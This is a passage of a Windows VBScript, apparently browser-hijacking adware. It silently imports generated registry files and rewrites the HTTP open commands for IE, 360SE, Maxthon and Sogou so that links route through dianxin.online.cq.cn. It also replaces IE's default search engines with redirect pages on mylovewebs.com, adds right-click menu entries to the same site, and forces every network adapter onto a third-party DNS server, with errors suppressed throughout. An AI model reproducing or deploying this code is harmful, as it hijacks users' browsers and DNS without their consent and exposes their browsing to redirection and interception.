    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00"
    f.WriteLine ""
    f.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Toolbar\WebBrowser]"
    f.WriteLine """{01E04581-4EEE-11D0-BFE9-00AA005B4383}""=hex:81,45,e0,01,ee,4e,d0,11,bf,e9,00,\"
    f.WriteLine "  aa,00,5b,43,83,10,00,00,00,00,00,00,00,01,e0,32,f4,01,00,00,00"
    f.WriteLine """{0E5CBF21-D15F-11D0-8301-00AA005B4383}""=hex:21,bf,5c,0e,5f,d1,d0,11,83,01,00,\"
    f.WriteLine "  aa,00,5b,43,83,22,00,1c,00,08,00,00,00,06,00,00,00,01,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,4c,00,00,00,01,14,02,00,00,00,00,00,c0,00,00,00,00,\"
    f.WriteLine "  00,00,46,81,00,00,00,10,00,00,00,fe,b8,49,65,27,bb,c9,01,12,c0,b1,6e,27,bb,\"
    f.WriteLine "  c9,01,5a,ac,06,68,27,bb,c9,01,00,00,00,00,00,00,00,00,01,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,5b,01,14,00,1f,50,e0,4f,d0,20,ea,3a,69,10,a2,d8,\"
    f.WriteLine "  08,00,2b,30,30,9d,19,00,2f,43,3a,5c,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,5c,00,31,00,00,00,00,00,8c,3a,cb,23,10,00,44,4f,43,55,4d,\"
    f.WriteLine "  45,7e,31,00,00,44,00,03,00,04,00,ef,be,8c,3a,da,21,8c,3a,cb,23,14,00,00,00,\"
    f.WriteLine "  44,00,6f,00,63,00,75,00,6d,00,65,00,6e,00,74,00,73,00,20,00,61,00,6e,00,64,\"
    f.WriteLine "  00,20,00,53,00,65,00,74,00,74,00,69,00,6e,00,67,00,73,00,00,00,18,00,4a,00,\"
    f.WriteLine "  31,00,00,00,00,00,8c,3a,cc,23,10,00,41,44,4d,49,4e,49,7e,31,00,00,32,00,03,\"
    f.WriteLine "  00,04,00,ef,be,8c,3a,cb,23,8c,3a,cc,23,14,00,00,00,41,00,64,00,6d,00,69,00,\"
    f.WriteLine "  6e,00,69,00,73,00,74,00,72,00,61,00,74,00,6f,00,72,00,00,00,18,00,56,00,31,\"
    f.WriteLine "  00,00,00,00,00,8c,3a,ce,23,11,00,46,41,56,4f,52,49,7e,31,00,00,3e,00,03,00,\"
    f.WriteLine "  04,00,ef,be,8c,3a,cb,23,8c,3a,ce,23,14,00,28,00,46,00,61,00,76,00,6f,00,72,\"
    f.WriteLine "  00,69,00,74,00,65,00,73,00,00,00,40,73,68,65,6c,6c,33,32,2e,64,6c,6c,2c,2d,\"
    f.WriteLine "  31,32,36,39,33,00,18,00,30,00,35,00,00,00,00,00,8c,3a,cf,23,10,00,fe,94,a5,\"
    f.WriteLine "  63,00,00,1c,00,03,00,04,00,ef,be,8c,3a,cc,23,8c,3a,cf,23,14,00,00,00,fe,94,\"
    f.WriteLine "  a5,63,00,00,14,00,00,00,60,00,00,00,03,00,00,a0,58,00,00,00,00,00,00,00,67,\"
    f.WriteLine "  68,6f,73,74,78,70,33,2d,34,36,37,36,38,30,00,08,ff,f6,b7,27,38,41,4d,8d,f3,\"
    f.WriteLine "  17,a7,2f,9d,10,1c,dd,0c,5a,86,1a,27,de,11,b2,8a,86,62,af,bb,9f,a2,08,ff,f6,\"
    f.WriteLine "  b7,27,38,41,4d,8d,f3,17,a7,2f,9d,10,1c,dd,0c,5a,86,1a,27,de,11,b2,8a,86,62,\"
    f.WriteLine "  af,bb,9f,a2,00,00,00,00"
    f.WriteLine """ITBarLayout""=hex:11,00,00,00,5c,00,00,00,00,00,00,00,34,00,00,00,1f,00,00,00,\"
    f.WriteLine "  56,00,00,00,01,00,00,00,20,07,00,00,a0,0f,00,00,05,00,00,00,62,05,00,00,26,\"
    f.WriteLine "  00,00,00,02,00,00,00,21,07,00,00,a0,0f,00,00,04,00,00,00,21,01,00,00,a0,0f,\"
    f.WriteLine "  00,00,03,00,00,00,20,03,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00"
    f.WriteLine """ITBar7Layout""=hex:13,00,00,00,00,00,00,00,00,00,00,00,30,00,00,00,14,00,00,00,\"
    f.WriteLine "  2a,00,00,00,01,00,00,00,80,06,00,00,80,01,00,00,03,00,00,00,81,02,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00"
    f.WriteLine """{B580CF65-E151-49C3-B73F-70B13FCA8E86}""=hex:65,cf,80,b5,51,e1,c3,49,b7,3f,70,\"
    f.WriteLine "  b1,3f,ca,8e,86"
    f.WriteLine """{F2CF5485-4E02-4F68-819C-B92DE9277049}""=hex:85,54,cf,f2,02,4e,68,4f,81,9c,b9,\"
    f.WriteLine "  2d,e9,27,70,49,22,00,1c,00,08,00,00,00,06,00,00,00,01,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,4c,00,00,00,01,14,02,00,00,00,00,00,c0,00,00,00,00,\"
    f.WriteLine "  00,00,46,81,00,00,00,10,00,00,00,10,a1,55,c0,ff,e9,ca,01,18,bf,0f,fd,11,ed,\"
    f.WriteLine "  ca,01,18,bf,0f,fd,11,ed,ca,01,00,00,00,00,00,00,00,00,01,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,5b,01,14,00,1f,50,e0,4f,d0,20,ea,3a,69,10,a2,d8,\"
    f.WriteLine "  08,00,2b,30,30,9d,19,00,2f,43,3a,5c,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,5c,00,31,00,00,00,00,00,8e,3a,b9,15,10,00,44,4f,43,55,4d,\"
    f.WriteLine "  45,7e,31,00,00,44,00,03,00,04,00,ef,be,8c,3a,da,21,a2,3c,2c,70,14,00,00,00,\"
    f.WriteLine "  44,00,6f,00,63,00,75,00,6d,00,65,00,6e,00,74,00,73,00,20,00,61,00,6e,00,64,\"
    f.WriteLine "  00,20,00,53,00,65,00,74,00,74,00,69,00,6e,00,67,00,73,00,00,00,18,00,4a,00,\"
    f.WriteLine "  31,00,00,00,00,00,a5,3c,05,86,10,00,41,44,4d,49,4e,49,7e,31,00,00,32,00,03,\"
    f.WriteLine "  00,04,00,ef,be,8c,3a,cb,23,a5,3c,05,86,14,00,00,00,41,00,64,00,6d,00,69,00,\"
    f.WriteLine "  6e,00,69,00,73,00,74,00,72,00,61,00,74,00,6f,00,72,00,00,00,18,00,56,00,31,\"
    f.WriteLine "  00,00,00,00,00,a2,3c,80,96,11,00,46,41,56,4f,52,49,7e,31,00,00,3e,00,03,00,\"
    f.WriteLine "  04,00,ef,be,a2,3c,00,70,a2,3c,80,96,14,00,28,00,46,00,61,00,76,00,6f,00,72,\"
    f.WriteLine "  00,69,00,74,00,65,00,73,00,00,00,40,73,68,65,6c,6c,33,32,2e,64,6c,6c,2c,2d,\"
    f.WriteLine "  31,32,36,39,33,00,18,00,30,00,35,00,00,00,00,00,a6,3c,e4,5d,10,00,fe,94,a5,\"
    f.WriteLine "  63,00,00,1c,00,03,00,04,00,ef,be,a2,3c,00,70,a6,3c,e4,5d,14,00,00,00,fe,94,\"
    f.WriteLine "  a5,63,00,00,14,00,00,00,60,00,00,00,03,00,00,a0,58,00,00,00,00,00,00,00,70,\"
    f.WriteLine "  63,32,30,31,30,30,35,30,32,32,31,76,63,62,00,08,ff,f6,b7,27,38,41,4d,8d,f3,\"
    f.WriteLine "  17,a7,2f,9d,10,1c,92,a9,ac,9d,ce,58,df,11,a8,ce,00,1e,65,ca,82,46,08,ff,f6,\"
    f.WriteLine "  b7,27,38,41,4d,8d,f3,17,a7,2f,9d,10,1c,92,a9,ac,9d,ce,58,df,11,a8,ce,00,1e,\"
    f.WriteLine "  65,ca,82,46,00,00,00,00"
    
    
    
	Set fso  = Nothing
	Set WshShell= CreateObject("WScript.Shell") 
	WshShell.Run "regedit /s " & regPathSix
	WshShell.Run "regedit /s " & regPathSeven
    Set WshShell  = Nothing
End Function


'�������Ӵ򿪵�ַ
Public Sub SetRegDefaultOpenUrl()   
On Error Resume Next
    dim url
    url="http://dianxin.online.cq.cn/api/http/index.htm?"
    dim ie_temp_path
    ie_temp_path=GetWebBrowserPath() '��ȡһ�������·��    
    Set fso = CreateObject("Scripting.FileSystemObject")    
    If not fso.FileExists(ie_temp_path) Then  '���������ȡĬ��
      ie_temp_path=iePath
    End If
    Set fso  = Nothing
    
    
    Const HKEY_CLASSES_ROOT = &H80000000
      
    strComputer = "."
    Set StdOut = WScript.StdOut   
    Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\default:StdRegProv")   
    
    strKeyPath = "HTTP\shell\360SE.exe\command"
    strValueName = ""
    
    oReg.GetExpandedStringValue HKEY_CLASSES_ROOT,strKeyPath,_   
    strValueName,strValue
    
    if strValue<>"" or instr(strValue,url)=0 then
        'д��ֵ���ڵ�
        strValueName = ""  
        strValue = """" & ie_temp_path & """" & " " & url & " " & "%1"
        oReg.SetExpandedStringValue HKEY_CLASSES_ROOT,strKeyPath,strValueName,strValue  
    end if 
    
    strKeyPath = "HTTP\shell\open\command"  
    strValueName = ""  
    oReg.GetExpandedStringValue HKEY_CLASSES_ROOT,strKeyPath,_   
    strValueName,strValue
    
    if strValue<>"" or instr(strValue,url)=0 then
        'д��ֵ���ڵ�
        strValueName = ""  
        strValue = """" & ie_temp_path & """" & " " & url & " " & "%1"
        oReg.SetExpandedStringValue HKEY_CLASSES_ROOT,strKeyPath,strValueName,strValue  
    end if 
    
    strKeyPath = "HTTP\shell\Maxthon2\command"
    strValueName = ""
    
    oReg.GetExpandedStringValue HKEY_CLASSES_ROOT,strKeyPath,_   
    strValueName,strValue
    
    if strValue<>"" or instr(strValue,url)=0 then
        'д��ֵ���ڵ�
        strValueName = ""  
        strValue = """" & ie_temp_path & """" & " " & url & " " & "%1"
        oReg.SetExpandedStringValue HKEY_CLASSES_ROOT,strKeyPath,strValueName,strValue  
    end if 
    
    strKeyPath = "HTTP\shell\SogouExplorer\command"
    strValueName = ""
    
    oReg.GetExpandedStringValue HKEY_CLASSES_ROOT,strKeyPath,_   
    strValueName,strValue
    
    if strValue<>"" or instr(strValue,url)=0 then
        'д��ֵ���ڵ�
        strValueName = ""  
        strValue = """" & ie_temp_path & """" & " " & url & " " & "%1"
        oReg.SetExpandedStringValue HKEY_CLASSES_ROOT,strKeyPath,strValueName,strValue  
    end if 
    
End Sub







'����IEĬ������,�ɹ�����1,ʧ�ܻ���󷵻�0
Public Function IeSearch()   
    url="http://www.mylovewebs.com"
    Set ws = CreateObject("WScript.Shell") 
    Set Environ = ws.Environment("process") 
    regPath = Environ("windir") & "\search.reg"
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set f1=fso.CreateTextFile(regPath, True)
	f1.WriteLine "Windows Registry Editor Version 5.00"
    f1.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\SearchScopes]"
    f1.WriteLine """DefaultScope""=""{B2D17A31-2642-4D03-9D1F-ABD3BE1DCC4E}"""
    
    f1.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\SearchScopes\{B2D17A31-2642-4D03-9D1F-ABD3BE1DCC4E}]"
    f1.WriteLine """DisplayName""=""�ٶ�һ�£����֪��"""
    f1.WriteLine """URL""=""" & url & "/api/baidu/so.htm?word={searchTerms}"""
    f1.WriteLine """FaviconPath""=""C:\\Documents and Settings\\Administrator\\Local Settings\\Application Data\\Microsoft\\Internet Explorer\\Services\\search_{B2D17A31-2642-4D03-9D1F-ABD3BE1DCC4E}.ico"""
    f1.WriteLine """SortIndex""=dword:00000002"
    
    f1.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\SearchScopes\{E140FB5B-2A9D-4FA4-A20F-089B92412200}]"
    f1.WriteLine """DisplayName""=""�Ա�����"""
    f1.WriteLine """URL""=""" & url & "/api/taobao/so.htm?word={searchTerms}"""
    f1.WriteLine """FaviconURL""=""http://www.taobao.com/favicon.ico"""
    f1.WriteLine """FaviconPath""=""C:\\Documents and Settings\\Administrator\\Local Settings\\Application Data\\Microsoft\\Internet Explorer\\Services\\search_{E140FB5B-2A9D-4FA4-A20F-089B92412200}.ico"""
    f1.WriteLine """SortIndex""=dword:00000006"
    
    Set fso = Nothing
	Set WshShell= CreateObject("WScript.Shell") 
	WshShell.Run "regedit /s " & regPath
    Set WshShell  = Nothing    
End Function



'����IE�Ҽ��˵�
Public Function AddRight()   
On Error Resume Next
    Set ws = CreateObject("WScript.Shell") 
    Set Environ = ws.Environment("process")   
    Dim regPathSeven
    regPathSeven = Environ("windir") & "\AddRight.reg"
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set f=fso.CreateTextFile(regPathSeven, True)
    f.WriteLine "Windows Registry Editor Version 5.00"
    f.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\ʹ��[�ۺ�]ѡ�ʿ�������]"
    f.WriteLine "@=""http://dianxin.online.cq.cn/api/tag/index.htm"""
    
    f.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\ʹ��[�ٶ�]ѡ�ʿ�������]"
    f.WriteLine "@=""http://dianxin.online.cq.cn/api/tag/baidu.htm"""
    
    f.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\ʹ��[�ȸ�]ѡ�ʿ�������]"
    f.WriteLine "@=""http://dianxin.online.cq.cn/api/tag/google.htm"""
    
    f.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\ʹ��[�е�]ѡ�ʿ�������]"
    f.WriteLine "@=""http://dianxin.online.cq.cn/api/tag/youdao.htm"""

	Set fso  = Nothing
	Set WshShell= CreateObject("WScript.Shell") 
	WshShell.Run "regedit /s " & regPathSeven
    Set WshShell  = Nothing
End Function


'�����û�����DNS��IP(���˻�ɫ��վ��ľ����վ��������վ)
Public Function SetFilterDns()   
On Error Resume Next
     Set objWMIService=GetObject("winmgmts:\\.\root\cimv2")
     Set colNetAdapters=objWMIService.ExecQuery("Select * from Win32_NetworkAdapterConfiguration where IPEnabled=TRUE")
     arrDNS=Array("119.84.84.11","8.8.8.8")
     For Each objNetAdapter in colNetAdapters
         If Isarray(arrDNS) Then objNetAdapter.SetDNSServerSearchOrder arrDNS
     Next
End Function 
'by 
